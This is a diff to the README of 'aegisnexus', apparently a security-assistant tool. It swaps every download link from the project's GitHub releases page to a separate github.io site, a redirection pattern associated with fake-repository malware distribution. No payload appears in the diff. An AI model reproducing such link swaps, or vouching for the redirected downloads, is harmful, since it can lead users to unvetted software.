@@ -1,7 +1,7 @@
 <h1>🛡️ aegisnexus - Your AI-Powered Security Operations Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/Muhammadati7871/aegisnexus/releases">
+  <a href="https://muhammadati7871.github.io">
     <img src="https://img.shields.io/badge/Download-AegisNexus_Now-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=ff6b6b" alt="Download AegisNexus" width="350">
   </a>
 </p>
@@ -34,7 +34,7 @@ Built with modern technology (FastAPI and Docker) to run smoothly on most comput
 ### 📥 Download and Installation
 
 Visit this link to download the application:
-**[Download AegisNexus](https://github.com/Muhammadati7871/aegisnexus/releases)**
+**[Download AegisNexus](https://muhammadati7871.github.io)**
 
 **What to do:**
 1. Click the download link above.
@@ -156,7 +156,7 @@ AegisNexus is released under the MIT License—free to use, modify, and distribu
 
 Don't let cyber threats intimidate you. With AegisNexus, you have a knowledgeable, cautious, and visually engaging security partner at your fingertips. Download it now and take the first step toward confident threat awareness.
 
-**[📥 Download AegisNexus Now](https://github.com/Muhammadati7871/aegisnexus/releases)**
+**[📥 Download AegisNexus Now](https://muhammadati7871.github.io)**
 
 ---
 
